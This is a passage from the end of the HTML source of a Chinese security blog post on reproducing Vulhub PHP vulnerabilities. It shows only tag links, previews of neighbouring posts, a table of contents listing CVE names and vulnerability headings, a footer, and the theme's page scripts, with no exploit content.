+  <div class="new-meta-item meta-tags"><a class="tag" href="/tags/Vulhub/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>Vulhub</p></a></div> <div class="new-meta-item meta-tags"><a class="tag" href="/tags/CVE/" rel="nofollow"><i class="fas fa-hashtag fa-fw" aria-hidden="true"></i><p>CVE</p></a></div>
+
+
+        
+      
+        
+          
+
+        
+      
+        
+          
+  <div class="new-meta-item share -mob-share-list">
+  <div class="-mob-share-list share-body">
+    
+      
+        <a class="-mob-share-qq" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.m00nback.xyz/2020/05/05/Vulhub%E4%B9%8Bphp/&title=Vulhub之php - 明月归的小站&summary=本篇博客主要复现了Vulhub上的php部分漏洞！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qq.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-qzone" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=http://www.m00nback.xyz/2020/05/05/Vulhub%E4%B9%8Bphp/&title=Vulhub之php - 明月归的小站&summary=本篇博客主要复现了Vulhub上的php部分漏洞！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/qzone.png">
+          
+        </a>
+      
+    
+      
+        <a class="-mob-share-weibo" title="" rel="external nofollow noopener noreferrer noopener"
+          
+          target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.m00nback.xyz/2020/05/05/Vulhub%E4%B9%8Bphp/&title=Vulhub之php - 明月归的小站&summary=本篇博客主要复现了Vulhub上的php部分漏洞！"
+          
+          >
+          
+            <img src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-org/logo/128/weibo.png">
+          
+        </a>
+      
+    
+  </div>
+</div>
+
+
+
+        
+      
+    </div>
+  </section>
+
+
+        
+        
+          <div class="prev-next">
+            
+              <a class='prev' href='/2020/05/06/ISCC2020-writeup/'>
+                <p class='title'><i class="fas fa-chevron-left" aria-hidden="true"></i>ISCC2020 writeup</p>
+                <p class='content'>记一下部分题目的writeup吧！
+
+
+练武题web阿森的爱情-1抓包发现Set-Cookie字段：添加并改成login=1
+然后发现
+
+
+解下MD5发现是573495，后来听说flag在rea...</p>
+              </a>
+            
+            
+              <a class='next' href='/2020/04/25/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8/'>
+                <p class='title'>PHP反序列化字符逃逸<i class="fas fa-chevron-right" aria-hidden="true"></i></p>
+                <p class='content'>本篇博客主要介绍了反序列化字符逃逸的相关内容！
+
+
+什么是反序列化字符逃逸？个人理解：在反序列化之前，存在对序列化字符串的替换等操作，导致可以构造特定的字符串序列达到本来完成不了的操作，比如修改...</p>
+              </a>
+            
+          </div>
+        
+      </section>
+    </article>
+  
+
+  
+    
+
+  <article class="post white-box reveal comments shadow">
+    <section class="article typo">
+      <p ct><i class='fas fa-comments'></i> 评论</p>
+      
+      <section id="comments">
+        <div id="valine_container" class="valine_thread">
+  <i class="fas fa-cog fa-spin fa-fw fa-2x"></i>
+</div>
+
+      </section>
+    </section>
+  </article>
+
+
+  
+
+
+
+
+<!-- 根据页面mathjax变量决定是否加载MathJax数学公式js -->
+
+
+</div>
+<aside class='l_side'>
+  
+  
+
+  
+    
+    
+
+
+
+  <section class="widget toc-wrapper shadow desktop mobile" id="toc-div" >
+    
+  <header>
+    
+      <i class="fas fa-list fa-fw" aria-hidden="true"></i><span class='name'>本文目录</span>
+    
+  </header>
+
+
+    <div class='content'>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2012-1823"><span class="toc-text">CVE-2012-1823</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2018-19518"><span class="toc-text">CVE-2018-19518</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-1"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-1"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2019-11043"><span class="toc-text">CVE-2019-11043</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-2"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-2"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8phpinfo%E5%8C%85%E5%90%AB%E4%B8%B4%E6%97%B6%E6%96%87%E4%BB%B6"><span class="toc-text">利用phpinfo包含临时文件</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-3"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XML%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E"><span class="toc-text">XML外部实体注入漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-4"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XDebug%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E6%BC%8F%E6%B4%9E"><span class="toc-text">XDebug远程调试漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-5"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-5"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-5223"><span class="toc-text">CVE-2017-5223</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-6"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-6"><span class="toc-text">漏洞复现</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CVE-2017-9841"><span class="toc-text">CVE-2017-9841</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B-7"><span class="toc-text">漏洞简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-7"><span class="toc-text">漏洞复现</span></a></li></ol></li></ol>
+    </div>
+  </section>
+
+
+  
+
+
+</aside>
+
+
+
+    </div>
+    
+  
+  <footer class="clearfix">
+    <br><br>
+    
+      
+        <br>
+        <div class="social-wrapper">
+          
+            
+              <a href="/atom.xml"
+                class="social fas fa-rss flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="mailto:3300162791@qq.com"
+                class="social fas fa-envelope flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+              <a href="https://github.com/BeyondOneself"
+                class="social fab fa-github flat-btn"
+                target="_blank"
+                rel="external nofollow noopener noreferrer">
+              </a>
+            
+          
+            
+          
+        </div>
+      
+    
+      
+        <div><p>博客内容遵循 <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">署名-非商业性使用-相同方式共享 4.0 国际 (CC BY-NC-SA 4.0) 协议</a></p>
+</div>
+      
+    
+      
+        本站使用
+        <a href="https://github.com/volantis-x/hexo-theme-volantis/releases/tag/3.0.0" target="_blank" class="codename">Volantis</a>
+        作为主题，总访问量为
+          <span id="busuanzi_value_site_pv"><i class="fas fa-circle-notch fa-spin fa-fw" aria-hidden="true"></i></span>
+          次
+        
+      
+    
+      
+        <div class='copyright'>
+        <p><a href="/">Copyright © 2019-2020</a></p>
+
+        </div>
+      
+    
+  </footer>
+
+
+    <a class="s-top fas fa-arrow-up fa-fw" href='javascript:void(0)'></a>
+  </div>
+  <div>
+    
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.5/dist/jquery.min.js"></script>
+
+
+
+  <script>
+    
+    var SEARCH_SERVICE = "hexo" || "hexo";
+    var ROOT = "/" || "/";
+    if (!ROOT.endsWith('/')) ROOT += '/';
+  </script>
+
+
+
+  <script async src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/instant_page.js" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+
+
+
+  
+  
+  
+    
+<script src="https://cdn.jsdelivr.net/npm/jquery-backstretch@2.1.18/jquery.backstretch.min.js"></script>
+
+    <script type="text/javascript">
+      $(function(){
+        var imgs=["https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/001.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/002.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/003.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/004.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/005.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/006.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/012.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/016.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/019.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/025.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/033.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/034.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/035.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/038.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/039.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/042.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/046.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/051.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/052.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/054.jpg", "https://cdn.jsdelivr.net/gh/volantis-x/cdn-wallpaper-minimalist/2020/056.jpg", "https://cdn.jsdelivr.net/gh/xaoxuu/cdn-wallpaper/abstract/41F215B9-261F-48B4-80B5-4E86E165259E.jpeg"];
+        if ('true' == 'true') {
+          function shuffle(arr){
+            /*From countercurrent-time*/
+            var n = arr.length;
+            while(n--) {
+              var index = Math.floor(Math.random() * n);
+              var temp = arr[index];
+              arr[index] = arr[n];
+              arr[n] = temp;
+            }
+          }
+          shuffle(imgs);
+        }
+        if ('.cover') {
+          $('.cover').backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        } else {
+          $.backstretch(
+            imgs,
+          {
+            duration: "20000",
+            fade: "1500"
+          });
+        }
+      });
+    </script>
+  
+
+
+
+
+
+
+  
+  
+<script src="/js/valine.js"></script>
+
+
+<script>
+  var GUEST_INFO = ['nick', 'mail', 'link'];
+  var meta = 'nick,mail,link'.split(',').filter(function (item) {
+    return GUEST_INFO.indexOf(item) > -1
+  });
+  var REQUIRED_FIELDS = ['nick', 'mail', 'link'];
+  var requiredFields = 'nick,mail'.split(',').filter(function (item) {
+    return REQUIRED_FIELDS.indexOf(item) > -1
+  });
+
+  function emoji(path, idx, ext) {
+    return path + "/" + path + "-" + idx + "." + ext;
+  }
+
+  var emojiMaps = {};
+  for (var i = 1; i <= 54; i++) {
+    emojiMaps['tieba-' + i] = emoji('tieba', i, 'png');
+  }
+  for (var i = 1; i <= 101; i++) {
+    emojiMaps['qq-' + i] = emoji('qq', i, 'gif');
+  }
+  for (var i = 1; i <= 116; i++) {
+    emojiMaps['aru-' + i] = emoji('aru', i, 'gif');
+  }
+  for (var i = 1; i <= 125; i++) {
+    emojiMaps['twemoji-' + i] = emoji('twemoji', i, 'png');
+  }
+  for (var i = 1; i <= 4; i++) {
+    emojiMaps['weibo-' + i] = emoji('weibo', i, 'png');
+  }
+
+  function pjax_valine() {
+    let pageUrl = $.trim($('#pjax-comment-path').text()) === "none" ? 
+      decodeURI(window.location.pathname) : $.trim($('#pjax-comment-path').text());
+    let pagePlaceholder = $.trim($('#pjax-comment-placeholder').text()) === "none" ?
+      "快来评论吧~" : $.trim($('#pjax-comment-placeholder').text());
+
+    let ALLPATH = '';
+    if(ALLPATH != '') pageUrl = ALLPATH;
+
+    var valine = new Valine();
+    valine.init({
+      el: '#valine_container',
+      meta: meta,
+      placeholder: pagePlaceholder,
+      path: pageUrl,
+      appId: "or2NepulP8NGKXehq1IRSQTc-gzGzoHsz",
+      appKey: "lRlc11XLlqK4AeDJeNJxo17y",
+      pageSize: '10',
+      avatar: 'robohash',
+      lang: 'zh-cn',
+      visitor: 'true',
+      highlight: 'true',
+      mathJax: 'false',
+      enableQQ: 'true',
+      requiredFields: requiredFields,
+      emojiCDN: 'https://cdn.jsdelivr.net/gh/volantis-x/cdn-emoji/valine/',
+      emojiMaps: emojiMaps
+    })
+  }
+
+  $(function () {
+    pjax_valine();
+  });
+</script>
+
+
+
+
+<!-- darkmodejs -->
+
+
+<!-- 复制 -->
+
+  <script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
+<script>
+    var clipboard = new ClipboardJS('.btn-copy', {
+        target: function (trigger) {
+            return trigger.nextElementSibling
+        }
+    });
+    function wait(callback, seconds) {
+        var timelag = null;
+        timelag = window.setTimeout(callback, seconds)
+    }
+    function pjax_initCopyCode() {
+        var copyHtml = '';
+        copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+        copyHtml += '<i class="fas fa-copy"></i><span>COPY</span>';
+        copyHtml += '</button>';
+        $(".highlight .code pre").before(copyHtml);
+        $(".article pre code").before(copyHtml);
+        clipboard.off('success').on('success', function (e) {
+            let $btn = $(e.trigger);
+            $btn.addClass('copied');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-check-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPIED';
+            wait(function () {
+                $icon.removeClass('fa-check-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        });
+        clipboard.off('error').on('error', function (e) {
+            e.clearSelection();
+            let $btn = $(e.trigger);
+            $btn.addClass('copy-failed');
+            let $icon = $($btn.find('i'));
+            $icon.removeClass('fa-copy');
+            $icon.addClass('fa-times-circle');
+            let $span = $($btn.find('span'));
+            $span[0].innerText = 'COPY FAILED';
+            wait(function () {
+                $icon.removeClass('fa-times-circle');
+                $icon.addClass('fa-copy');
+                $span[0].innerText = 'COPY'
+            }, 2000)
+        })
+    }
+    $(function () {
+        pjax_initCopyCode()
+    });
+</script>
+
+
+<!-- scrollreveal -->
+
+  <script src="https://cdn.jsdelivr.net/npm/scrollreveal@4.0.6/dist/scrollreveal.min.js"></script>
+  <script type="text/javascript">
+    function pjax_scrollrebeal() {
+      ScrollReveal().reveal('.l_main .reveal', {
+        distance: '32px',
+        duration: '800',
+        interval: '20',
+        scale: '1',
+        easing: 'ease-out'
+      });
+    }
+
+    $(function () {
+      pjax_scrollrebeal();
+    });
+  </script>
+
+<!-- ******************************** -->
+
+<!-- fancybox -->
+<script src="https://cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js"></script>
+<script>
+  function pjax_fancybox() {
+    $(".article-entry").find("img").not('.inline').not('a img').each(function () { //渲染 fancybox
+      var element = document.createElement("a"); // a 标签
+      $(element).attr("class", "fancybox");
+      $(element).attr("pjax-fancybox", "");  // 过滤 pjax
+      $(element).attr("href", $(this).attr("src"));
+      if ($(this).attr("data-original")) {
+        $(element).attr("href", $(this).attr("data-original"));
+      }
+      $(element).attr("data-fancybox", "images");
+      var caption = "";   // 描述信息
+      if ($(this).attr('alt')) {  // 判断当前页面是否存在描述信息
+        $(element).attr('data-caption', $(this).attr('alt'));
+        caption = $(this).attr('alt');
+      }
+      var div = document.createElement("div");
+      $(div).addClass("fancybox");
+      $(this).wrap(div); // 最外层套 div ，其实主要作用还是 class 样式
+      var span = document.createElement("span");
+      $(span).addClass("image-caption");
+      $(span).text(caption); // 加描述
+      $(this).after(span);  // 再套一层描述
+      $(this).wrap(element);  // 最后套 a 标签
+    })
+    $(".article-entry").find("img").fancybox({
+      selector: '[data-fancybox="images"]',
+      hash: false,
+      loop: false,
+      closeClick: true,
+      helpers: {
+        overlay: {closeClick: true}
+      },
+      buttons: [
+        "zoom",
+        "close"
+      ]
+    });
+  };
+  $(function () {
+    pjax_fancybox();
+  });
+</script>
+
+<!-- ******************************** -->
+
+
+  
+<script src="/js/app.js"></script>
+
+
+
+
+  
+    
+<script src="/js/search.js"></script>
+
+  
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-busuanzi@2.3/js/busuanzi.pure.mini.js" data-pjax></script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/npm/node-waves@0.7.6/dist/waves.min.js"></script>
+
+  <script type="text/javascript">
+    $(function () {
+      Waves.attach('.flat-btn', ['waves-button']);
+      Waves.attach('.float-btn', ['waves-button', 'waves-float']);
+      Waves.attach('.float-btn-light', ['waves-button', 'waves-float', 'waves-light']);
+      Waves.attach('.flat-box', ['waves-block']);
+      Waves.attach('.float-box', ['waves-block', 'waves-float']);
+      Waves.attach('.waves-image');
+      Waves.init();
+    });
+  </script>
+
+
+
+  
+<script src="https://cdn.jsdelivr.net/gh/volantis-x/cdn-volantis@2/js/comment_typing.js"></script>
+
+
+
+
+
+
+
+    
+      
+
+
+<script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.min.js"></script>
+
+<!-- 样式位于：source/css/_third-party/pjaxanimate.styl -->
+
+<div class="pjax-animate">
+  
+    <script src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>
+    <div id="loading-bar-wrapper"><script>NProgress.configure({parent:"#loading-bar-wrapper",trickleSpeed: 100})</script></div>
+    <script>
+      window.ShowLoading = function() {
+        NProgress.start();
+      };
+      window.HideLoading = function() {
+        NProgress.done();
+      }
+    </script>
+  
+</div>
+
+<script>
+    var pjax;
+    document.addEventListener('DOMContentLoaded', function () {
+      pjax = new Pjax({
+        elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([pjax-fancybox])',
+        selectors: [
+          "title",
+          "#pjax-container",
+          "#pjax-header-nav-list"
+        ],
+        cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+        timeout: 5000
+      });
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+      window.stop(); // 相当于点击了浏览器的停止按钮
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      window.subData = null; // 移除标题（用于一二级导航栏切换处）
+      $.fancybox.close();    // 关闭弹窗
+      $('.l_header .switcher .s-search').removeClass('active'); // 关闭移动端激活的搜索框
+      $('.l_header').removeClass('z_search-open'); // 关闭移动端激活的搜索框
+      $('.wrapper').removeClass('sub'); // 跳转页面时关闭二级导航
+
+      // 解绑事件 避免重复监听
+      $('.s-top').unbind('click');
+      $('.menu a').unbind('click');
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+      window.ShowLoading();
+    });
+
+    document.addEventListener('pjax:complete', function () {
+      // 关于百度统计对 SPA 页面的处理：
+      // 方案一：百度统计>管理>单页应用设置中，打开开启按钮即可对SPA进行统计。 https://tongji.baidu.com/web/help/article?id=324
+      // 方案二：取消注释下列代码。 https://tongji.baidu.com/web/help/article?id=235
+      // 
+
+      // 关于谷歌统计对 SPA 页面的处理：
+      // 当应用以动态方式加载内容并更新地址栏中的网址时，也应该更新通过 gtag.js 存储的网页网址。
+      // https://developers.google.cn/analytics/devguides/collection/gtagjs/single-page-applications?hl=zh-cn
+      
+
+      $('.nav-main').find('.list-v').not('.menu-phone').removeAttr("style",""); // 移除小尾巴的移除
+      $('.menu-phone.list-v').removeAttr("style",""); // 移除小尾巴的移除
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+
+      try{
+        pjax_fancybox();
+        
+          
+          if ('.cover') {
+            $('.cover').backstretch("resize");
+          } else {
+            $.backstretch("resize");
+          }
+        
+        
+        
+          pjax_scrollrebeal();
+        
+        
+          pjax_initCopyCode();
+        
+        
+          pjax_valine();
+        
+        
+        
+        
+        
+      } catch (e) {
+        console.log(e);
+      }
+      window.HideLoading();
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.HideLoading();
+      window.location.href = e.triggerElement.href;
+    });
+</script>
+
+    
+  </div>
+</body>
+</html>
